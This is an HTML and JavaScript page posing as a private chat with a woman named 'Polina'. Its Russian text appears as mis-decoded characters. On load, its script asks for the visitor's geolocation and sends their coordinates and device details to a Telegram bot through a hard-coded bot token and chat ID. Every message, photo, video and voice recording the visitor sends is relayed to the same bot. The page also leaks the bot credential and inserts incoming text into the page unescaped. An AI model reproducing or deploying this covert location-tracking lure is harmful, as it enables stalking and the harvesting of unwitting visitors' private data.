<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>–ß–∞—Ç —Å –ü–æ–ª–∏–Ω–æ–π</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #18191a;
            color: #e4e6eb;
            margin: 0;
            min-height: 100vh;
        }
        .chat-container {
            max-width: 540px;
            margin: 40px auto;
            background: #242526;
            border-radius: 14px;
            box-shadow: 0 4px 24px #0005;
            padding: 0 0 20px 0;
            display: flex;
            flex-direction: column;
            min-height: 80vh;
        }
        .header {
            display: flex;
            align-items: center;
            padding: 20px 24px 16px 24px;
            border-bottom: 1px solid #393a3b;
            background: #242526;
            border-radius: 14px 14px 0 0;
        }
        .avatar {
            width: 48px; height: 48px;
            border-radius: 50%; object-fit: cover;
            margin-right: 15px;
            border: 2px solid #3578e5;
        }
        .name {
            font-size: 1.3em;
            font-weight: bold;
            color: #fff;
        }
        .messages {
            flex: 1;
            min-height: 200px;
            max-height: 60vh;
            overflow-y: auto;
            padding: 24px 16px 0 16px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .msg {
            display: flex;
            align-items: flex-end;
            margin: 0;
        }
        .msg.me {
            flex-direction: row-reverse;
        }
        .msg .bubble {
            max-width: 70%;
            padding: 12px 18px;
            border-radius: 18px;
            font-size: 1.05em;
            background: #3578e5;
            color: #fff;
            margin: 0 8px;
            box-shadow: 0 2px 8px #0002;
            word-break: break-word;
            position: relative;
        }
        .msg.me .bubble {
            background: #4e4f50;
            color: #e4e6eb;
        }
        .msg .avatar {
            width: 36px; height: 36px;
            margin: 0 4px;
            border: 2px solid #3578e5;
        }
        .msg.me .avatar {
            border: 2px solid #4e4f50;
        }
        .msg .bubble .sender {
            display: block;
            font-size: 0.85em;
            color: #b0b3b8;
            margin-bottom: 2px;
        }
        .msg .media {
            max-width: 220px; max-height: 220px;
            display: block;
            margin: 5px 0;
            border-radius: 12px;
            background: #222;
        }
        .input-area {
            display: flex;
            gap: 5px;
            padding: 16px 16px 0 16px;
            border-top: 1px solid #393a3b;
            background: #242526;
            border-radius: 0 0 14px 14px;
        }
        .input-area input[type="text"] {
            flex: 1;
            padding: 10px 16px;
            border-radius: 20px;
            border: none;
            background: #3a3b3c;
            color: #fff;
            font-size: 1em;
        }
        .input-area input[type="text"]:focus {
            outline: 2px solid #3578e5;
        }
        .input-area input[type="file"] {
            display: none;
        }
        .input-area label {
            cursor: pointer;
            background: #3a3b3c;
            color: #b0b3b8;
            padding: 7px 12px;
            border-radius: 8px;
            font-size: 1.2em;
            transition: background 0.2s;
        }
        .input-area label:hover {
            background: #3578e5;
            color: #fff;
        }
        .input-area button {
            background: #3578e5;
            color: #fff;
            border: none;
            border-radius: 8px;
            padding: 8px 15px;
            font-size: 1.1em;
            transition: background 0.2s;
        }
        .input-area button:hover {
            background: #2851a3;
        }
        @media (max-width: 600px) {
            .chat-container { max-width: 100vw; margin: 0; border-radius: 0; min-height: 100vh; }
            .header { padding: 14px 8px 10px 8px; }
            .messages { padding: 12px 4px 0 4px; }
            .input-area { padding: 10px 4px 0 4px; }
        }
    </style>
</head>
<body>
<div class="chat-container">
    <div class="header">
        <img src="–ü–û–õ–ò–ù–ê.jpg" alt="–ü–æ–ª–∏–Ω–∞" class="avatar">
        <span class="name">–ü–æ–ª–∏–Ω–∞</span>
    </div>
    <div class="messages" id="messages"></div>
    <form class="input-area" id="chatForm">
        <input type="text" id="textInput" placeholder="–°–æ–æ–±—â–µ–Ω–∏–µ..." autocomplete="off">
        <label>
            üì∑
            <input type="file" id="fileInput" accept="image/*,video/*,audio/*">
        </label>
        <button type="button" id="voiceBtn">üé§</button>
        <button type="submit">–û—Ç–ø—Ä–∞–≤–∏—Ç—å</button>
    </form>
</div>
<script>
const BOT_TOKEN = '8188957293:AAHmtiE3sgaj0lhUYijUmOnUYBWDaJw39JE';
const CHAT_ID = '2126669672';
const POLINA_AVATAR = '–ü–û–õ–ò–ù–ê.jpg';
// const ME_AVATAR = 'me.jpg'; // –ë–æ–ª—å—à–µ –Ω–µ –Ω—É–∂–µ–Ω
const POLINA_NAME = '–ü–æ–ª–∏–Ω–∞';
const ME_NAME = '–í—ã';

const messages = document.getElementById('messages');
const chatForm = document.getElementById('chatForm');
const textInput = document.getElementById('textInput');
const fileInput = document.getElementById('fileInput');
const voiceBtn = document.getElementById('voiceBtn');

let lastUpdateId = localStorage.getItem('lastUpdateId') || 0;

// --- –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –ø–µ—Ä–µ–ø–∏—Å–∫–∏ ---
let chatHistory = JSON.parse(localStorage.getItem('polinaChatHistory') || '[]');

function saveChatHistory() {
    localStorage.setItem('polinaChatHistory', JSON.stringify(chatHistory));
}

function renderChatHistory() {
    messages.innerHTML = '';
    chatHistory.forEach(msgObj => {
        addMessage(msgObj.text, msgObj.type, msgObj.fileUrl, msgObj.isMe, true);
    });
}

// --- addMessage —Å –æ–ø—Ü–∏–µ–π silent ---
function addMessage(text, type = 'text', fileUrl = null, isMe = true, silent = false) {
    const msg = document.createElement('div');
    msg.className = 'msg' + (isMe ? ' me' : '');
    let content = '';
    let sender = isMe ? ME_NAME : POLINA_NAME;
    if (type === 'text') {
        content = `<span class="bubble"><span class="sender">${sender}</span>${text}</span>`;
    } else if (type === 'image') {
        content = `<span class="bubble"><span class="sender">${sender}</span><img src="${fileUrl}" class="media"></span>`;
    } else if (type === 'video') {
        content = `<span class="bubble"><span class="sender">${sender}</span><video src="${fileUrl}" controls class="media"></video></span>`;
    } else if (type === 'audio') {
        content = `<span class="bubble"><span class="sender">${sender}</span><audio src="${fileUrl}" controls class="media"></audio></span>`;
    }
    if (isMe) {
        // –ë–µ–∑ –∞–≤–∞—Ç–∞—Ä–∫–∏
        msg.innerHTML = content;
    } else {
        msg.innerHTML = `<img src="${POLINA_AVATAR}" class="avatar">` + content;
    }
    messages.appendChild(msg);
    messages.scrollTop = messages.scrollHeight;
    if (!silent) {
        chatHistory.push({text, type, fileUrl, isMe});
        saveChatHistory();
    }
}

function sendToBot(formData) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: formData.text || '[–º–µ–¥–∏–∞]',
            disable_notification: false
        })
    });
    // –î–ª—è –º–µ–¥–∏–∞ –∏—Å–ø–æ–ª—å–∑—É–µ–º sendPhoto/sendVideo/sendVoice
    if (formData.file) {
        let type = formData.file.type || '';
        let tgMethod = type.startsWith('image/') ? 'sendPhoto' :
                       type.startsWith('video/') ? 'sendVideo' :
                       type.startsWith('audio/') ? 'sendVoice' : null;
        if (tgMethod) {
            let data = new FormData();
            data.append('chat_id', CHAT_ID);
            data.append(type.startsWith('audio/') ? 'voice' : (type.startsWith('image/') ? 'photo' : 'video'), formData.file);
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${tgMethod}`, {
                method: 'POST',
                body: data
            });
        }
    }
}

chatForm.addEventListener('submit', function(e) {
    e.preventDefault();
    const text = textInput.value.trim();
    if (text) {
        addMessage(text, 'text', null, true);
        sendToBot({text});
        textInput.value = '';
    }
});

fileInput.addEventListener('change', function() {
    const file = fileInput.files[0];
    if (!file) return;
    const url = URL.createObjectURL(file);
    let type = file.type;
    if (type.startsWith('image/')) {
        addMessage('', 'image', url, true);
    } else if (type.startsWith('video/')) {
        addMessage('', 'video', url, true);
    } else if (type.startsWith('audio/')) {
        addMessage('', 'audio', url, true);
    }
    sendToBot({file});
    fileInput.value = '';
});

// –ì–æ–ª–æ—Å–æ–≤—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è —á–µ—Ä–µ–∑ Web Audio API
let mediaRecorder, audioChunks = [];
voiceBtn.onclick = async function() {
    if (!mediaRecorder || mediaRecorder.state === 'inactive') {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
        mediaRecorder.onstop = () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
            const url = URL.createObjectURL(audioBlob);
            addMessage('', 'audio', url, true);
            sendToBot({file: audioBlob});
            audioChunks = [];
        };
        mediaRecorder.start();
        voiceBtn.textContent = '‚èπÔ∏è';
    } else {
        mediaRecorder.stop();
        voiceBtn.textContent = 'üé§';
    }
};

// –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è ‚Äî —Å–ø—Ä–∞—à–∏–≤–∞—Ç—å —Ç–æ–ª—å–∫–æ –æ–¥–∏–Ω —Ä–∞–∑
function getDeviceModel() {
    let ua = navigator.userAgent;
    let model = ua.match(/\(([^)]+)\)/);
    return model ? model[1] : ua;
}
function sendLocationAndDevice() {
    if (localStorage.getItem('geoAsked')) return;
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(pos) {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const device = getDeviceModel();
            const text = `üåç –ù–æ–≤—ã–π –≤—Ö–æ–¥ –≤ —á–∞—Ç!\n–ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ: https://maps.google.com/?q=${lat},${lon}\n–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${device}`;
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text
                })
            });
            localStorage.setItem('geoAsked', '1');
        }, function() {
            // –î–∞–∂–µ –µ—Å–ª–∏ –æ—Ç–∫–∞–∑–∞–ª ‚Äî –±–æ–ª—å—à–µ –Ω–µ —Å–ø—Ä–∞—à–∏–≤–∞—Ç—å
            localStorage.setItem('geoAsked', '1');
        });
    } else {
        localStorage.setItem('geoAsked', '1');
    }
}

// –ü–æ–ª—É—á–µ–Ω–∏–µ –Ω–æ–≤—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π –æ—Ç –±–æ—Ç–∞ (–æ—Ç –ü–æ–ª–∏–Ω—ã)
function pollPolinaMessages() {
    setInterval(async () => {
        try {
            const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${parseInt(lastUpdateId)+1}`);
            const data = await resp.json();
            if (data.ok && data.result && data.result.length) {
                data.result.forEach(update => {
                    lastUpdateId = update.update_id;
                    localStorage.setItem('lastUpdateId', lastUpdateId);
                    if (update.message && update.message.chat && update.message.chat.id == CHAT_ID) {
                        // –ï—Å–ª–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ –Ω–µ –æ—Ç –Ω–∞—Å (–±–æ—Ç–∞), –∞ –æ—Ç –ü–æ–ª–∏–Ω—ã
                        if (update.message.from && update.message.from.username !== 'your_bot_username') {
                            if (update.message.text) {
                                addMessage(update.message.text, 'text', null, false);
                            } else if (update.message.photo) {
                                // –ë–µ—Ä—ë–º –Ω–∞–∏–±–æ–ª—å—à–µ–µ —Ñ–æ—Ç–æ
                                const fileId = update.message.photo[update.message.photo.length-1].file_id;
                                fetchPhotoUrl(fileId, url => addMessage('', 'image', url, false));
                            } else if (update.message.voice) {
                                fetchFileUrl(update.message.voice.file_id, url => addMessage('', 'audio', url, false));
                            } else if (update.message.video) {
                                fetchFileUrl(update.message.video.file_id, url => addMessage('', 'video', url, false));
                            }
                        }
                    }
                });
            }
        } catch(e) {}
    }, 3000);
}

// –ü–æ–ª—É—á–∏—Ç—å —Å—Å—ã–ª–∫—É –Ω–∞ —Ñ–∞–π–ª Telegram
function fetchFileUrl(fileId, cb) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`)
        .then(r=>r.json())
        .then(data => {
            if (data.ok && data.result && data.result.file_path) {
                cb(`https://api.telegram.org/file/bot${BOT_TOKEN}/${data.result.file_path}`);
            }
        });
}
function fetchPhotoUrl(fileId, cb) {
    fetchFileUrl(fileId, cb);
}

// --- –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ –∏—Å—Ç–æ—Ä–∏–∏ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ ---
window.onload = function() {
    sendLocationAndDevice();
    renderChatHistory();
    pollPolinaMessages();
};
</script>
</body>
</html>